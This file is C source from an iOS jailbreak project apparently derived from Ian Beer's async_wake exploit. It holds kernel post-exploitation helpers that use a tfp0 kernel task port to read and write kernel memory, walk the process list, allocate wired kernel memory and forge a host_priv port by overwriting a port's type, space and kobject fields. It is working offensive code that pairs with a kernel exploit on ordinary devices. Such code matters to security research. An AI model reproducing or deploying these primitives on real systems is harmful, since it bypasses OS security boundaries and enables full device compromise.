//
//  *.c
//  async_wake_ios
//
//  Created by George on 18/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "ku.h"
#include "patchfinder64.h"
#include "kmem.h"
unsigned p_pid = 0x10;
unsigned task = 0x18;
unsigned itk_space = 0x308;
unsigned ip_kobject = 0x68;
unsigned ipc_space_is_table = 0x20;

/****** Kernel utility stuff ******/

mach_port_t tfpzero;

void init_kernel_utils(mach_port_t tfp0) {
    tfpzero = tfp0;
}

uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}


uint64_t task_self_addr() {
    uint64_t selfproc = proc_for_pid(getpid());
    if (selfproc == 0) {
        fprintf(stderr, "failed to find our task addr\n");
        exit(EXIT_FAILURE);
    }
    uint64_t addr = kread64(selfproc + task);
    return addr;
}

uint64_t ipc_space_kernel() {
    return kread64(task_self_addr() + 060);
}

uint64_t find_port_address(mach_port_name_t port) {
    
    uint64_t task_addr = task_self_addr();
    uint64_t _itk_space = kread64(task_addr + itk_space);
    
    uint64_t is_table = kread64(_itk_space + ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
    
    return port_addr;
}

mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port_address(mach_host_self());
    uint64_t realhost = kread64(hostport_addr + ip_kobject);
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port_address(port);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    kwrite32(port_addr + 0, IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    kwrite64(port_addr + 0x60, ipc_space_kernel());
    
    // set the kobject
    kwrite64(port_addr + ip_kobject, realhost);
    
    fake_host_priv_port = port;
    
    return port;
}

uint64_t kmem_alloc_wired(uint64_t size) {
    if (tfpzero == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    
    printf("allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("address to wire: %llx\n", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}

uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t));
    return out;
}

void kwrite32(uint64_t where, uint32_t what) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t));
}

void kwrite64(uint64_t where, uint64_t what) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t));
}

uint64_t proc_for_pid(pid_t pid) {
    uint64_t proc = kread64(find_allproc()), pd;
    while (proc) {
        pd = kread32(proc + p_pid);
        if (pd == pid) return proc;
        proc = kread64(proc);
    }
    return 0;
}

uint64_t proc_for_name(char *nm) {
    uint64_t proc = kread64(find_allproc());
    char name[40] = {0};
    while (proc) {
        kread(proc + 0x268, name, 20);
        if (strstr(name, nm)) return proc;
        proc = kread64(proc);
    }
    return 0;
}

unsigned int pid_for_name(char *nm) {
    uint64_t proc = kread64(find_allproc());
    char name[40] = {0};
    while (proc) {
        kread(proc + 0x268, name, 20);
        if (strstr(name, nm)) return kread32(proc + p_pid);
        proc = kread64(proc);
    }
    return 0;
}

uint64_t find_kernproc() {
    uint64_t proc = kread64(find_allproc()), pd;
    while (proc) {
        pd = kread32(kread64(proc) + p_pid);
        if (pd == 0) return proc;
        proc = kread64(proc);
    }
    
    return 0;
}

typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        uint64_t zone_map = rk64(find_zone_map_ref());
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        printf("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            printf("kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            printf("zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}
